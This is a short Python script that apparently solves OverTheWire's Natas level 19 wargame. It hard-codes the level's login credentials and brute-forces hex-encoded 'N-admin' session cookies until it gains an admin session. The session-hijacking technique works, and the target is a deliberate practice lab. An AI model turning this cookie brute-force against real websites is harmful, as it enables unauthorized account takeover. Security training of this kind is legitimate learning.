import requests
import string
import binascii

level = "natas19"
auth = (level, "4IwIrekcuZlA9OsjOkoUtwU6lhokCPYs")
url = f"http://{level}.natas.labs.overthewire.org/"

ses = requests.session()
for cookie in range(1,5000):
    payload = binascii.hexlify(f"{cookie}-admin".encode()).decode()
    print(payload)
    res = ses.get(url, auth=auth, cookies={"PHPSESSID": payload}).content
    #print(payload, t)
    if b"You are logged in as a regular user." not in res:
        print(res)
        break 